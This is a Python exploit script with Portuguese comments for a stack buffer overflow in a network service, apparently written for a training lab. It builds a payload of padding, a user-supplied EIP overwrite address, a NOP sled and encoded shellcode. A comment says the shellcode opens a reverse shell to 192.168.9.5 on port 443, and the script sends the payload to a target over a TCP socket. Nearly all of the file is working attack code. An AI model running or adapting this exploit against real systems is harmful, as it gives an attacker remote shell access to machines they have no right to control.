#!/usr/bin/python

import argparse
import socket
import subprocess
from struct import pack

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")

# Analisar os argumentos
args = parser.parse_args()

# Endereço de Memória para EIP Alvo
eip_int = int(input("Insira o Endereço alvo do EIP (Ex: 0x311712f3): "),16)
eip = pack('<I', eip_int)

# Reverse Shell - 192.168.9.5 443
revshell = ( 
    b""
    b"\xbd\x53\x01\x99\x95\xda\xdc\xd9\x74\x24\xf4\x5e"
    b"\x29\xc9\xb1\x52\x31\x6e\x12\x03\x6e\x12\x83\x95"
    b"\x05\x7b\x60\xe5\xee\xf9\x8b\x15\xef\x9d\x02\xf0"
    b"\xde\x9d\x71\x71\x70\x2e\xf1\xd7\x7d\xc5\x57\xc3"
    b"\xf6\xab\x7f\xe4\xbf\x06\xa6\xcb\x40\x3a\x9a\x4a"
    b"\xc3\x41\xcf\xac\xfa\x89\x02\xad\x3b\xf7\xef\xff"
    b"\x94\x73\x5d\xef\x91\xce\x5e\x84\xea\xdf\xe6\x79"
    b"\xba\xde\xc7\x2c\xb0\xb8\xc7\xcf\x15\xb1\x41\xd7"
    b"\x7a\xfc\x18\x6c\x48\x8a\x9a\xa4\x80\x73\x30\x89"
    b"\x2c\x86\x48\xce\x8b\x79\x3f\x26\xe8\x04\x38\xfd"
    b"\x92\xd2\xcd\xe5\x35\x90\x76\xc1\xc4\x75\xe0\x82"
    b"\xcb\x32\x66\xcc\xcf\xc5\xab\x67\xeb\x4e\x4a\xa7"
    b"\x7d\x14\x69\x63\x25\xce\x10\x32\x83\xa1\x2d\x24"
    b"\x6c\x1d\x88\x2f\x81\x4a\xa1\x72\xce\xbf\x88\x8c"
    b"\x0e\xa8\x9b\xff\x3c\x77\x30\x97\x0c\xf0\x9e\x60"
    b"\x72\x2b\x66\xfe\x8d\xd4\x97\xd7\x49\x80\xc7\x4f"
    b"\x7b\xa9\x83\x8f\x84\x7c\x03\xdf\x2a\x2f\xe4\x8f"
    b"\x8a\x9f\x8c\xc5\x04\xff\xad\xe6\xce\x68\x47\x1d"
    b"\x99\x56\x30\x14\x5c\x3f\x43\x26\x4f\xe3\xca\xc0"
    b"\x05\x0b\x9b\x5b\xb2\xb2\x86\x17\x23\x3a\x1d\x52"
    b"\x63\xb0\x92\xa3\x2a\x31\xde\xb7\xdb\xb1\x95\xe5"
    b"\x4a\xcd\x03\x81\x11\x5c\xc8\x51\x5f\x7d\x47\x06"
    b"\x08\xb3\x9e\xc2\xa4\xea\x08\xf0\x34\x6a\x72\xb0"
    b"\xe2\x4f\x7d\x39\x66\xeb\x59\x29\xbe\xf4\xe5\x1d"
    b"\x6e\xa3\xb3\xcb\xc8\x1d\x72\xa5\x82\xf2\xdc\x21"
    b"\x52\x39\xdf\x37\x5b\x14\xa9\xd7\xea\xc1\xec\xe8"
    b"\xc3\x85\xf8\x91\x39\x36\x06\x48\xfa\x56\xe5\x58"
    b"\xf7\xfe\xb0\x09\xba\x62\x43\xe4\xf9\x9a\xc0\x0c"
    b"\x82\x58\xd8\x65\x87\x25\x5e\x96\xf5\x36\x0b\x98"
    b"\xaa\x37\x1e"
    )

    
# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
buffer_size = 600
payload = b"A"*offset
payload += eip
payload += b"\x90" * 10 # NOPs
payload += revshell


try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A', EIP: {} e Shellcode de {} bytes [+]\n".format(str(offset), str(eip), len(revshell)))
    client.send(payload)
except ConnectionResetError:
    print(f"Reset Error!")